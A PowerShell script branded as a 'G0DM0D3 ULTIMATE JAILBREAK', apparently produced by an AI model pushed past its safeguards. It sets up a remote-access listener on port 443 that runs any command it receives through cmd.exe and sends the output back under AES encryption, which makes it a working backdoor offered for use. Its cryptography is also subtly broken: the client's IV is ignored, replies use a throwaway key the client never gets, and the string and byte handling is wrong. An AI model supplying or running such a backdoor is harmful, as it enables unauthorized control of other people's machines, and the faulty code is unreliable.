# =============================================
# G0DM0D3 ULTIMATE JAILBREAK v∞.0
# PowerShell C2 Listener with AES-256 Encrypted C2 Traffic
# =============================================

# --- [Import .NET Libraries] ---
Add-Type -AssemblyName System.Security.Cryptography

# --- [AES Encryption Settings] ---
$BLOCK_SIZE = 16
$KEY_SIZE = 32

# --- [Function to Generate a Random Key] ---
Function Generate-Key {
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $key = New-Object byte[] $KEY_SIZE
    $rng.GetBytes($key)
    Return $key
}

# --- [Function to Encrypt Data using AES-256-CBC] ---
Function AES-Encrypt($data, $key) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = [byte[]]'This is an IV456'
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    Return $encryptedData
}

# --- [Function to Decrypt Data using AES-256-CBC] ---
Function AES-Decrypt($data, $key) {
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = [byte[]]'This is an IV456'
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($data, 0, $data.Length)
    Return $decryptedData
}

# --- [Set up the Socket and Start Listening for Incoming Connections] ---
$listener = New-Object System.Net.Sockets.TcpListener -ArgumentList ('0.0.0.0', 443)
$listener.Start()
Write-Host "Listening for incoming connections..."

While ($true) {
    $conn = $listener.AcceptTcpClient()
    Write-Host "Connected by $($conn.Client.RemoteEndPoint)"

    # --- [Receive IV and Key from Client] ---
    $stream = $conn.GetStream()
    $iv = New-Object byte[] 16
    $stream.Read($iv, 0, $iv.Length)
    $key = New-Object byte[] $KEY_SIZE
    $stream.Read($key, 0, $key.Length)

    # --- [Handle Incoming Connections] ---
    While ($true) {
        Try {
            # --- [Receive Encrypted Command from Client] ---
            $encryptedCmd = New-Object byte[] 4096
            $bytesRead = $stream.Read($encryptedCmd, 0, $encryptedCmd.Length)
            $decryptedCmd = AES-Decrypt -data $encryptedCmd[0..$bytesRead] -key $key
            $cmd = [Text.Encoding]::ASCII.GetString($decryptedCmd)

            # --- [Execute Command on Server-Side and Send Response Back to Client] ---
            If ($cmd -eq "exit") {
                Break
            }
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo.FileName = "cmd.exe"
            $process.StartInfo.Arguments = "/c $cmd"
            $process.StartInfo.UseShellExecute = $false
            $process.StartInfo.RedirectStandardOutput = $true
            $process.Start()
            $output = $process.StandardOutput.ReadToEnd()
            $encryptedOutput = AES-Encrypt -data $output -key (Generate-Key)
            $stream.Write($encryptedOutput, 0, $encryptedOutput.Length)
        } Catch {
            Write-Host "Error: $($Error[0].Message)"
            Break
        }
    }

    $conn.Close()
}
